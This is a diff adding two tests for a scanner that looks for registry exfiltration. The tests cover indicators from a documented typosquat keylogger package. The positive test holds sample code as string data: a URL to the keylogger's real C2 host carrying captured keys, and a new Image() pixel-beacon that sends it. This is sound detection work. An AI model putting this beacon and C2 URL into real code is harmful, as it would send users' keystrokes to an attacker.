@@ -1303,6 +1303,58 @@ test("verify-no-registry-exfiltration ignores benign Toptal-shaped tokens", asyn
   assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
 });
 
+test("verify-no-registry-exfiltration flags the react-login-page keylogger IOCs", async () => {
+  // Positive: the documented IOCs from the Socket 2024-07-02 write-up on
+  // the `reect-login-page` typosquat keylogger family
+  // (https://socket.dev/blog/malicious-npm-package-typosquats-react-login-page-to-deploy-keylogger):
+  //   - C2 host + path `adlinczewska.pl/beaut-login/keylog.php`
+  //   - `new Image()` pixel-beacon constructor used to bypass CORS
+  //     by setting `.src = url + keystrokes` (image requests are not
+  //     subject to the Same-Origin Policy).
+  // Both are DOM-only / browser-side primitives that have no place in
+  // `@daloyjs/core`'s server-side `src/**` runtime source.
+  const { findForbiddenRegistryExfilCalls } = await import(
+    "../scripts/verify-no-registry-exfiltration.js"
+  );
+  const sample = [
+    "// unsafe: documented C2 host + path for the reect-login-page keylogger",
+    'const exfil = "https://adlinczewska.pl/beaut-login/keylog.php?c=" + keys;',
+    "",
+    "// unsafe: DOM-only pixel-beacon constructor that bypasses CORS",
+    "const beacon = new Image();",
+    "beacon.src = exfil;",
+  ].join("\n");
+  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
+  assert.equal(findings.length, 2, JSON.stringify(findings, null, 2));
+  assert.match(findings[0]!.reason, /adlinczewska\.pl\/beaut-login/);
+  assert.match(findings[1]!.reason, /new Image\(\)/);
+  for (const finding of findings) {
+    assert.match(finding.reason, /reect-login-page/);
+  }
+});
+
+test("verify-no-registry-exfiltration ignores benign react-login-shaped tokens", async () => {
+  // Negative: a doc-comment mention of the IOC host, an unrelated host
+  // that merely *contains* the substring `adlinczewska` outside the
+  // `/beaut-login` path, and an identifier like `newImage` (no space
+  // and no `(` immediately after `Image`) must NOT trip the gate.
+  const { findForbiddenRegistryExfilCalls } = await import(
+    "../scripts/verify-no-registry-exfiltration.js"
+  );
+  const sample = [
+    "// safe: doc-comment mention of the IOC host",
+    "// the reect-login-page keylogger POSTed to adlinczewska.pl/beaut-login/keylog.php",
+    "",
+    "// safe: unrelated identifier (no `new ` prefix, no `(` suffix)",
+    "const newImage = await loadImage();",
+    "",
+    "// safe: a property access on an `Image` namespace, not a constructor call",
+    "const fmt = Image.format;",
+  ].join("\n");
+  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
+  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
+});
+
 test("verify-no-registry-exfiltration accepts the live src/ tree", async () => {
   const { findForbiddenRegistryExfilCalls } = await import(
     "../scripts/verify-no-registry-exfiltration.js"
